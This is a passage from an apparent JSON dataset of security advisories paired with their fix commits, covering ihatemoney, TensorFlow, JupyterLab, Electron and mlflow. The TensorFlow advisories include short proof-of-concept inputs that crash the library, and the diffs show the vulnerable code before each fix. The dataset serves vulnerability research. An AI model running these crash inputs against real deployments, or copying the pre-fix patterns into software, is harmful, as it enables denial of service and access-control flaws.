            "patch_content":"From 8d77cf5d5646e1d2d8ded13f0660638f57e98471 Mon Sep 17 00:00:00 2001\nFrom: Baptiste Jonglez <git@bitsofnetworks.org>\nDate: Fri, 17 Jul 2020 17:43:33 +0200\nSubject: [PATCH] Fix unauthorized access and modification of project data\n (CVE-2020-15120)\n\nAn authenticated member of one project can modify and delete members of\nanother project, without knowledge of this other project's private\ncode. This can be further exploited to access all bills of another project\nwithout knowledge of this other project's private code.\n\nWith the default configuration, anybody is allowed to create a new\nproject. An attacker can create a new project and then use it to become\nauthenticated and exploit this flaw. As such, the exposure is similar to\nan unauthenticated attack, because it is trivial to become authenticated.\n\nThis issue was caused by a wrong database queries in PersonQuery.\n\nFor more details, see https:\/\/github.com\/spiral-project\/ihatemoney\/security\/advisories\/GHSA-67j9-c52g-w2q9\n---\n ihatemoney\/models.py | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/ihatemoney\/models.py b\/ihatemoney\/models.py\nindex fe7b5196d..5691c75ed 100644\n--- a\/ihatemoney\/models.py\n+++ b\/ihatemoney\/models.py\n@@ -380,7 +380,7 @@ class PersonQuery(BaseQuery):\n         def get_by_name(self, name, project):\n             return (\n                 Person.query.filter(Person.name == name)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n@@ -389,7 +389,7 @@ def get(self, id, project=None):\n                 project = g.project\n             return (\n                 Person.query.filter(Person.id == id)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )",
            "code_diff":"@@ -380,7 +380,7 @@ class PersonQuery(BaseQuery):\n         def get_by_name(self, name, project):\n             return (\n                 Person.query.filter(Person.name == name)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )\n \n@@ -389,7 +389,7 @@ def get(self, id, project=None):\n                 project = g.project\n             return (\n                 Person.query.filter(Person.id == id)\n-                .filter(Project.id == project.id)\n+                .filter(Person.project_id == project.id)\n                 .one()\n             )"
        },
        {
            "index":753,
            "vuln_id":"GHSA-gf88-j2mg-cc82",
            "cwe_id":"{'CWE-681'}",
            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992'}",
            "dataset":"osv",
            "summary":"Crash caused by integer conversion to unsigned ### Impact\nAn attacker can cause a denial of service in `boosted_trees_create_quantile_stream_resource` by using negative arguments:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_boosted_trees_ops\nimport numpy as np\n\nv= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])\ngen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(\n  quantile_stream_resource_handle = v.handle,\n  epsilon = [74.82224],\n  num_streams = [-49], \n  max_elements = np.int32(586))\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc#L96) does not validate that `num_streams` only contains non-negative numbers. In turn, [this results in using this value to allocate memory](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/boosted_trees\/quantiles\/quantile_stream_resource.h#L31-L40):\n\n```cc\nclass BoostedTreesQuantileStreamResource : public ResourceBase {\n public:\n  BoostedTreesQuantileStreamResource(const float epsilon,\n                                     const int64 max_elements,\n                                     const int64 num_streams)\n      : are_buckets_ready_(false),\n        epsilon_(epsilon),\n        num_streams_(num_streams),\n        max_elements_(max_elements) {\n    streams_.reserve(num_streams_);\n    ...\n  }\n}\n```\n\nHowever, `reserve` receives an unsigned integer so there is an implicit conversion from a negative value to a large positive unsigned. This results in a crash from the standard library.\n\n### Patches\nWe have patched the issue in GitHub commit [8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-08-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992",
            "commit_sha":"8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992",
            "patch":"SINGLE",
            "chain_ord":"['8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992']",
            "before_first_fix_commit":"{'f8a1ac8d75f9b3d00c90148ca1e91b735b6d542c'}",
            "last_fix_commit":"8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/28\/2021, 22:34:04",
            "message":"Ensure num_streams >= 0 in tf.raw_ops.BoostedTreesCreateQuantileStreamResource\n\nPiperOrigin-RevId: 387452765\nChange-Id: I9990c760e177fabca6a3b9b4612ceeaeeba51495",
            "author":"Laura Pak",
            "comments":null,
            "stats":"{'additions': 3, 'deletions': 0, 'total': 3}",
            "files":"{'tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992\/tensorflow%2Fcore%2Fkernels%2Fboosted_trees%2Fquantile_ops.cc', 'patch': '@@ -116,6 +116,9 @@ class BoostedTreesCreateQuantileStreamResourceOp : public OpKernel {\\n     const Tensor* num_streams_t;\\n     OP_REQUIRES_OK(context, context->input(kNumStreamsName, &num_streams_t));\\n     int64_t num_streams = num_streams_t->scalar<int64>()();\\n+    OP_REQUIRES(context, num_streams >= 0,\\n+                errors::InvalidArgument(\\n+                    \"Num_streams input cannot be a negative integer\"));\\n \\n     auto result =\\n         new QuantileStreamResource(epsilon, max_elements_, num_streams);'}}",
            "message_norm":"ensure num_streams >= 0 in tf.raw_ops.boostedtreescreatequantilestreamresource\n\npiperorigin-revid: 387452765\nchange-id: i9990c760e177fabca6a3b9b4612ceeaeeba51495",
            "language":"en",
            "entities":"[('ensure', 'ACTION', ''), ('387452765', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc'])",
            "num_files":1.0,
            "patch_content":"From 8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992 Mon Sep 17 00:00:00 2001\nFrom: Laura Pak <lpak@google.com>\nDate: Wed, 28 Jul 2021 15:34:04 -0700\nSubject: [PATCH] Ensure num_streams >= 0 in\n tf.raw_ops.BoostedTreesCreateQuantileStreamResource\n\nPiperOrigin-RevId: 387452765\nChange-Id: I9990c760e177fabca6a3b9b4612ceeaeeba51495\n---\n tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc | 3 +++\n 1 file changed, 3 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc b\/tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc\nindex c245b25aab0fbf..13a0056060e92a 100644\n--- a\/tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc\n+++ b\/tensorflow\/core\/kernels\/boosted_trees\/quantile_ops.cc\n@@ -116,6 +116,9 @@ class BoostedTreesCreateQuantileStreamResourceOp : public OpKernel {\n     const Tensor* num_streams_t;\n     OP_REQUIRES_OK(context, context->input(kNumStreamsName, &num_streams_t));\n     int64_t num_streams = num_streams_t->scalar<int64>()();\n+    OP_REQUIRES(context, num_streams >= 0,\n+                errors::InvalidArgument(\n+                    \"Num_streams input cannot be a negative integer\"));\n \n     auto result =\n         new QuantileStreamResource(epsilon, max_elements_, num_streams);",
            "code_diff":"@@ -116,6 +116,9 @@ class BoostedTreesCreateQuantileStreamResourceOp : public OpKernel {\n     const Tensor* num_streams_t;\n     OP_REQUIRES_OK(context, context->input(kNumStreamsName, &num_streams_t));\n     int64_t num_streams = num_streams_t->scalar<int64>()();\n+    OP_REQUIRES(context, num_streams >= 0,\n+                errors::InvalidArgument(\n+                    \"Num_streams input cannot be a negative integer\"));\n \n     auto result =\n         new QuantileStreamResource(epsilon, max_elements_, num_streams);"
        },
        {
            "index":946,
            "vuln_id":"GHSA-x4qx-4fjv-hmw6",
            "cwe_id":"{'CWE-190'}",
            "score":6.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a'}",
            "dataset":"osv",
            "summary":"Integer overflow leading to crash in Tensorflow ### Impact \nThe [implementation of `SparseCountSparseOutput`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/count_ops.cc#L168-L273) can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n    \ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[1,1]],\n  values=[2],\n  dense_shape=[2 ** 31, 2 ** 32],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6f4d3e8139ec724dbbcb40505891c81dd1052c4a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
            "published_date":"2022-02-09",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a",
            "commit_sha":"6f4d3e8139ec724dbbcb40505891c81dd1052c4a",
            "patch":"SINGLE",
            "chain_ord":"['6f4d3e8139ec724dbbcb40505891c81dd1052c4a']",
            "before_first_fix_commit":"{'adbbabdb0d3abb3cdeac69e38a96de1d678b24b3'}",
            "last_fix_commit":"6f4d3e8139ec724dbbcb40505891c81dd1052c4a",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/08\/2021, 04:04:02",
            "message":"Prevent crash due to integer overflow followed by allocating negative sized array.\n\nPiperOrigin-RevId: 414891322\nChange-Id: I5df390e0dc1d9f115209293708950cdf9306931c",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 9, 'deletions': 0, 'total': 9}",
            "files":"{'tensorflow\/core\/kernels\/count_ops.cc': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6f4d3e8139ec724dbbcb40505891c81dd1052c4a\/tensorflow%2Fcore%2Fkernels%2Fcount_ops.cc', 'patch': '@@ -13,6 +13,8 @@ See the License for the specific language governing permissions and\\n limitations under the License.\\n ==============================================================================*\/\\n \\n+#include <limits>\\n+\\n #include \"absl\/container\/flat_hash_map.h\"\\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n #include \"tensorflow\/core\/framework\/op_requires.h\"\\n@@ -23,6 +25,9 @@ limitations under the License.\\n \\n namespace tensorflow {\\n \\n+\/\/ Don\\'t allocate too large `BatchedMap<T>` objects\\n+static int kMaxBatches = std::numeric_limits<int>::max();\\n+\\n template <class T>\\n using BatchedMap = std::vector<absl::flat_hash_map<int64_t, T>>;\\n \\n@@ -235,6 +240,10 @@ class SparseCount : public OpKernel {\\n \\n     bool is_1d = shape.NumElements() == 1;\\n     int num_batches = is_1d ? 1 : shape_vector(0);\\n+    OP_REQUIRES(\\n+        context, 0 < num_batches && num_batches < kMaxBatches,\\n+        errors::InvalidArgument(\"Cannot allocate \", num_batches,\\n+                                \" batches, is the dense shape too wide?\"));\\n \\n     const auto values_values = values.flat<T>();\\n     const auto weight_values = weights.flat<W>();'}}",
            "message_norm":"prevent crash due to integer overflow followed by allocating negative sized array.\n\npiperorigin-revid: 414891322\nchange-id: i5df390e0dc1d9f115209293708950cdf9306931c",
            "language":"en",
            "entities":"[('prevent', 'ACTION', ''), ('integer overflow', 'SECWORD', ''), ('414891322', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])",
            "num_files":1.0,
            "patch_content":"From 6f4d3e8139ec724dbbcb40505891c81dd1052c4a Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Tue, 7 Dec 2021 20:04:02 -0800\nSubject: [PATCH] Prevent crash due to integer overflow followed by allocating\n negative sized array.\n\nPiperOrigin-RevId: 414891322\nChange-Id: I5df390e0dc1d9f115209293708950cdf9306931c\n---\n tensorflow\/core\/kernels\/count_ops.cc | 9 +++++++++\n 1 file changed, 9 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/count_ops.cc b\/tensorflow\/core\/kernels\/count_ops.cc\nindex cc101b66f81403..3f9df8f0d69d69 100644\n--- a\/tensorflow\/core\/kernels\/count_ops.cc\n+++ b\/tensorflow\/core\/kernels\/count_ops.cc\n@@ -13,6 +13,8 @@ See the License for the specific language governing permissions and\n limitations under the License.\n ==============================================================================*\/\n \n+#include <limits>\n+\n #include \"absl\/container\/flat_hash_map.h\"\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\n #include \"tensorflow\/core\/framework\/op_requires.h\"\n@@ -23,6 +25,9 @@ limitations under the License.\n \n namespace tensorflow {\n \n+\/\/ Don't allocate too large `BatchedMap<T>` objects\n+static int kMaxBatches = std::numeric_limits<int>::max();\n+\n template <class T>\n using BatchedMap = std::vector<absl::flat_hash_map<int64_t, T>>;\n \n@@ -235,6 +240,10 @@ class SparseCount : public OpKernel {\n \n     bool is_1d = shape.NumElements() == 1;\n     int num_batches = is_1d ? 1 : shape_vector(0);\n+    OP_REQUIRES(\n+        context, 0 < num_batches && num_batches < kMaxBatches,\n+        errors::InvalidArgument(\"Cannot allocate \", num_batches,\n+                                \" batches, is the dense shape too wide?\"));\n \n     const auto values_values = values.flat<T>();\n     const auto weight_values = weights.flat<W>();",
            "code_diff":"@@ -13,6 +13,8 @@ See the License for the specific language governing permissions and\n limitations under the License.\n ==============================================================================*\/\n \n+#include <limits>\n+\n #include \"absl\/container\/flat_hash_map.h\"\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\n #include \"tensorflow\/core\/framework\/op_requires.h\"\n@@ -23,6 +25,9 @@ limitations under the License.\n \n namespace tensorflow {\n \n+\/\/ Don't allocate too large `BatchedMap<T>` objects\n+static int kMaxBatches = std::numeric_limits<int>::max();\n+\n template <class T>\n using BatchedMap = std::vector<absl::flat_hash_map<int64_t, T>>;\n \n@@ -235,6 +240,10 @@ class SparseCount : public OpKernel {\n \n     bool is_1d = shape.NumElements() == 1;\n     int num_batches = is_1d ? 1 : shape_vector(0);\n+    OP_REQUIRES(\n+        context, 0 < num_batches && num_batches < kMaxBatches,\n+        errors::InvalidArgument(\"Cannot allocate \", num_batches,\n+                                \" batches, is the dense shape too wide?\"));\n \n     const auto values_values = values.flat<T>();\n     const auto weight_values = weights.flat<W>();"
        },
        {
            "index":501,
            "vuln_id":"GHSA-4952-p58q-6crx",
            "cwe_id":"{'CWE-87', 'CWE-79', 'CWE-75'}",
            "score":7.4,
            "chain":"{'https:\/\/github.com\/jupyterlab\/jupyterlab\/commit\/504825938c0abfa2fb8ff8d529308830a5ae42ed'}",
            "dataset":"osv",
            "summary":"JupyterLab: XSS due to lack of sanitization of the action attribute of an html <form> ### Impact\n\nUntrusted notebook can execute code on load. This is a remote code execution, but requires user action to open a notebook.\n\n### Patches\n\nPatched in the following versions: 3.1.4, 3.0.17, 2.3.2, 2.2.10, 1.2.21.\n\n### References\n\n[OWASP Page on Restricting Form Submissions](https:\/\/cheatsheetseries.owasp.org\/cheatsheets\/Content_Security_Policy_Cheat_Sheet.html)\n\n### For more information\n\nIf you have any questions or comments about this advisory, or vulnerabilities to report, please email our security list security@ipython.org.\n\nCredit: Guillaume Jeanne from Google",
            "published_date":"2021-08-23",
            "chain_len":1,
            "project":"https:\/\/github.com\/jupyterlab\/jupyterlab",
            "commit_href":"https:\/\/github.com\/jupyterlab\/jupyterlab\/commit\/504825938c0abfa2fb8ff8d529308830a5ae42ed",
            "commit_sha":"504825938c0abfa2fb8ff8d529308830a5ae42ed",
            "patch":"SINGLE",
            "chain_ord":"['504825938c0abfa2fb8ff8d529308830a5ae42ed']",
            "before_first_fix_commit":"{'ccb65656e3ed9c47d3e6fedbcff2405885d0bcaa'}",
            "last_fix_commit":"504825938c0abfa2fb8ff8d529308830a5ae42ed",
            "chain_ord_pos":1.0,
            "commit_datetime":"08\/05\/2021, 16:42:03",
            "message":"Merge pull request from GHSA-4952-p58q-6crx\n\nRemove `form` tags' `action` attribute during sanitizing.\n\nCo-authored-by: Afshin Taylor Darian <git@darian.af>",
            "author":"Steven Silvester",
            "comments":null,
            "stats":"{'additions': 0, 'deletions': 1, 'total': 1}",
            "files":"{'packages\/apputils\/src\/sanitizer.ts': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterlab\/jupyterlab\/raw\/504825938c0abfa2fb8ff8d529308830a5ae42ed\/packages%2Fapputils%2Fsrc%2Fsanitizer.ts', 'patch': \"@@ -624,7 +624,6 @@ export class Sanitizer implements ISanitizer {\\n       font: ['color', 'face', 'size'],\\n       form: [\\n         'accept',\\n-        'action',\\n         'autocomplete',\\n         'enctype',\\n         'method',\"}}",
            "message_norm":"merge pull request from ghsa-4952-p58q-6crx\n\nremove `form` tags' `action` attribute during sanitizing.\n\nco-authored-by: afshin taylor darian <git@darian.af>",
            "language":"en",
            "entities":"[('ghsa-4952-p58q-6crx', 'VULNID', 'GHSA'), ('remove', 'ACTION', ''), ('sanitizing', 'SECWORD', ''), ('git@darian.af', 'EMAIL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['packages\/apputils\/src\/sanitizer.ts'])",
            "num_files":1.0,
            "patch_content":"From 504825938c0abfa2fb8ff8d529308830a5ae42ed Mon Sep 17 00:00:00 2001\nFrom: Steven Silvester <ssilvester@apple.com>\nDate: Thu, 5 Aug 2021 11:42:03 -0500\nSubject: [PATCH] Merge pull request from GHSA-4952-p58q-6crx\n\nRemove `form` tags' `action` attribute during sanitizing.\n\nCo-authored-by: Afshin Taylor Darian <git@darian.af>\n---\n packages\/apputils\/src\/sanitizer.ts | 1 -\n 1 file changed, 1 deletion(-)\n\ndiff --git a\/packages\/apputils\/src\/sanitizer.ts b\/packages\/apputils\/src\/sanitizer.ts\nindex b281cc4172d6..897f215229f0 100644\n--- a\/packages\/apputils\/src\/sanitizer.ts\n+++ b\/packages\/apputils\/src\/sanitizer.ts\n@@ -624,7 +624,6 @@ export class Sanitizer implements ISanitizer {\n       font: ['color', 'face', 'size'],\n       form: [\n         'accept',\n-        'action',\n         'autocomplete',\n         'enctype',\n         'method',",
            "code_diff":"@@ -624,7 +624,6 @@ export class Sanitizer implements ISanitizer {\n       font: ['color', 'face', 'size'],\n       form: [\n         'accept',\n-        'action',\n         'autocomplete',\n         'enctype',\n         'method',"
        },
        {
            "index":155,
            "vuln_id":"GHSA-fjqr-fx3f-g4rv",
            "cwe_id":"{'CWE-78'}",
            "score":8.8,
            "chain":"{'https:\/\/github.com\/electron\/electron\/commit\/ce361a12e355f9e1e99c989f1ea056c9e502dbe7'}",
            "dataset":"osv",
            "summary":"Electron protocol handler browser vulnerable to Command Injection Github Electron version Electron 1.8.2-beta.4 and earlier contains a Command Injection vulnerability in Protocol Handler that can result in command execute. This attack appear to be exploitable via the victim opening an electron protocol handler in their browser. This vulnerability appears to have been fixed in Electron 1.8.2-beta.5. This issue is due to an incomplete fix for CVE-2018-1000006, specifically the black list used was not case insensitive allowing an attacker to potentially bypass it.",
            "published_date":"2018-03-26",
            "chain_len":1,
            "project":"https:\/\/github.com\/electron\/electron",
            "commit_href":"https:\/\/github.com\/electron\/electron\/commit\/ce361a12e355f9e1e99c989f1ea056c9e502dbe7",
            "commit_sha":"ce361a12e355f9e1e99c989f1ea056c9e502dbe7",
            "patch":"SINGLE",
            "chain_ord":"['ce361a12e355f9e1e99c989f1ea056c9e502dbe7']",
            "before_first_fix_commit":"{'278c58055ed36f6f22cea05a9cd85a5ab4fb3010'}",
            "last_fix_commit":"ce361a12e355f9e1e99c989f1ea056c9e502dbe7",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/01\/2018, 00:35:09",
            "message":"Use case-insensitive switch comparisons",
            "author":"Samuel Attard",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 1, 'total': 3}",
            "files":"{'atom\/app\/command_line_args.cc': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/electron\/electron\/raw\/ce361a12e355f9e1e99c989f1ea056c9e502dbe7\/atom%2Fapp%2Fcommand_line_args.cc', 'patch': '@@ -1390,7 +1390,8 @@ bool IsBlacklistedArg(const base::CommandLine::CharType* arg) {\\n \\n   if (prefix_length > 0) {\\n     a += prefix_length;\\n-    std::string switch_name(a, strcspn(a, \"=\"));\\n+    std::string switch_name =\\n+        base::ToLowerASCII(base::StringPiece(a, strcspn(a, \"=\")));\\n     auto* iter = std::lower_bound(std::begin(kBlacklist), std::end(kBlacklist),\\n                                   switch_name);\\n     if (iter != std::end(kBlacklist) && switch_name == *iter) {'}}",
            "message_norm":"use case-insensitive switch comparisons",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['atom\/app\/command_line_args.cc'])",
            "num_files":1.0,
            "patch_content":"From ce361a12e355f9e1e99c989f1ea056c9e502dbe7 Mon Sep 17 00:00:00 2001\nFrom: Samuel Attard <samuel.r.attard@gmail.com>\nDate: Wed, 31 Jan 2018 17:35:09 -0700\nSubject: [PATCH] Use case-insensitive switch comparisons\n\n---\n atom\/app\/command_line_args.cc | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\ndiff --git a\/atom\/app\/command_line_args.cc b\/atom\/app\/command_line_args.cc\nindex d7426de7dc564..e83eed46f2e11 100644\n--- a\/atom\/app\/command_line_args.cc\n+++ b\/atom\/app\/command_line_args.cc\n@@ -1390,7 +1390,8 @@ bool IsBlacklistedArg(const base::CommandLine::CharType* arg) {\n \n   if (prefix_length > 0) {\n     a += prefix_length;\n-    std::string switch_name(a, strcspn(a, \"=\"));\n+    std::string switch_name =\n+        base::ToLowerASCII(base::StringPiece(a, strcspn(a, \"=\")));\n     auto* iter = std::lower_bound(std::begin(kBlacklist), std::end(kBlacklist),\n                                   switch_name);\n     if (iter != std::end(kBlacklist) && switch_name == *iter) {",
            "code_diff":"@@ -1390,7 +1390,8 @@ bool IsBlacklistedArg(const base::CommandLine::CharType* arg) {\n \n   if (prefix_length > 0) {\n     a += prefix_length;\n-    std::string switch_name(a, strcspn(a, \"=\"));\n+    std::string switch_name =\n+        base::ToLowerASCII(base::StringPiece(a, strcspn(a, \"=\")));\n     auto* iter = std::lower_bound(std::begin(kBlacklist), std::end(kBlacklist),\n                                   switch_name);\n     if (iter != std::end(kBlacklist) && switch_name == *iter) {"
        },
        {
            "index":685,
            "vuln_id":"GHSA-vqj2-4v8m-8vrq",
            "cwe_id":"{'CWE-377', 'CWE-668'}",
            "score":8.2,
            "chain":"{'https:\/\/github.com\/mlflow\/mlflow\/commit\/61984e6843d2e59235d82a580c529920cd8f3711'}",
            "dataset":"osv",
            "summary":"Insecure Temporary File in mlflow mlflow prior to 1.23.1 contains an insecure temporary file. The insecure function `tempfile.mktemp()` is deprecated and `mkstemp()` should be used instead.",
            "published_date":"2022-02-24",
            "chain_len":1,
            "project":"https:\/\/github.com\/mlflow\/mlflow",
            "commit_href":"https:\/\/github.com\/mlflow\/mlflow\/commit\/61984e6843d2e59235d82a580c529920cd8f3711",
            "commit_sha":"61984e6843d2e59235d82a580c529920cd8f3711",
            "patch":"SINGLE",
            "chain_ord":"['61984e6843d2e59235d82a580c529920cd8f3711']",
            "before_first_fix_commit":"{'271750bc2a65f469956a11499c022df138c6d0f6'}",
            "last_fix_commit":"61984e6843d2e59235d82a580c529920cd8f3711",
            "chain_ord_pos":1.0,
            "commit_datetime":"01\/26\/2022, 23:59:23",
            "message":"Use mkstemp to replace deprecated mktemp call (#5303)\n\n* Use mkstemp\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Remove num examples\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Close instead of remove\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* Close the handle\r\n\r\nSigned-off-by: dbczumar <corey.zumar@databricks.com>",
            "author":"Corey Zumar",
            "comments":"{'com_1': {'author': 'sr-mpamera', 'datetime': '03\/02\/2022, 15:40:16', 'body': 'The security check fails even though the mlflow is upgraded to 1.23.1. It gives the error \"Insecure Temporary File in mlflow\".\\r\\nAny suggested solution please ?'}}",
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'mlflow\/utils\/file_utils.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mlflow\/mlflow\/raw\/61984e6843d2e59235d82a580c529920cd8f3711\/mlflow%2Futils%2Ffile_utils.py', 'patch': '@@ -287,7 +287,7 @@ def _filter_timestamps(tar_info):\\n         tar_info.mtime = 0\\n         return tar_info if custom_filter is None else custom_filter(tar_info)\\n \\n-    unzipped_filename = tempfile.mktemp()\\n+    unzipped_file_handle, unzipped_filename = tempfile.mkstemp()\\n     try:\\n         with tarfile.open(unzipped_filename, \"w\") as tar:\\n             tar.add(source_dir, arcname=archive_name, filter=_filter_timestamps)\\n@@ -298,7 +298,7 @@ def _filter_timestamps(tar_info):\\n         ) as gzipped_tar, open(unzipped_filename, \"rb\") as tar:\\n             gzipped_tar.write(tar.read())\\n     finally:\\n-        os.remove(unzipped_filename)\\n+        os.close(unzipped_file_handle)\\n \\n \\n def _copy_project(src_path, dst_path=\"\"):'}}",
            "message_norm":"use mkstemp to replace deprecated mktemp call (#5303)\n\n* use mkstemp\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* remove num examples\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* close instead of remove\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>\r\n\r\n* close the handle\r\n\r\nsigned-off-by: dbczumar <corey.zumar@databricks.com>",
            "language":"en",
            "entities":"[('#5303', 'ISSUE', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('remove', 'ACTION', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('remove', 'ACTION', ''), ('corey.zumar@databricks.com', 'EMAIL', ''), ('corey.zumar@databricks.com', 'EMAIL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['mlflow\/utils\/file_utils.py'])",
            "num_files":1.0,
            "patch_content":"From 61984e6843d2e59235d82a580c529920cd8f3711 Mon Sep 17 00:00:00 2001\nFrom: Corey Zumar <39497902+dbczumar@users.noreply.github.com>\nDate: Wed, 26 Jan 2022 15:59:23 -0800\nSubject: [PATCH] Use mkstemp to replace deprecated mktemp call (#5303)\n\n* Use mkstemp\n\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\n\n* Remove num examples\n\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\n\n* Close instead of remove\n\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\n\n* Close the handle\n\nSigned-off-by: dbczumar <corey.zumar@databricks.com>\n---\n mlflow\/utils\/file_utils.py | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/mlflow\/utils\/file_utils.py b\/mlflow\/utils\/file_utils.py\nindex 32653b343c445..4b59a367372af 100644\n--- a\/mlflow\/utils\/file_utils.py\n+++ b\/mlflow\/utils\/file_utils.py\n@@ -287,7 +287,7 @@ def _filter_timestamps(tar_info):\n         tar_info.mtime = 0\n         return tar_info if custom_filter is None else custom_filter(tar_info)\n \n-    unzipped_filename = tempfile.mktemp()\n+    unzipped_file_handle, unzipped_filename = tempfile.mkstemp()\n     try:\n         with tarfile.open(unzipped_filename, \"w\") as tar:\n             tar.add(source_dir, arcname=archive_name, filter=_filter_timestamps)\n@@ -298,7 +298,7 @@ def _filter_timestamps(tar_info):\n         ) as gzipped_tar, open(unzipped_filename, \"rb\") as tar:\n             gzipped_tar.write(tar.read())\n     finally:\n-        os.remove(unzipped_filename)\n+        os.close(unzipped_file_handle)\n \n \n def _copy_project(src_path, dst_path=\"\"):",
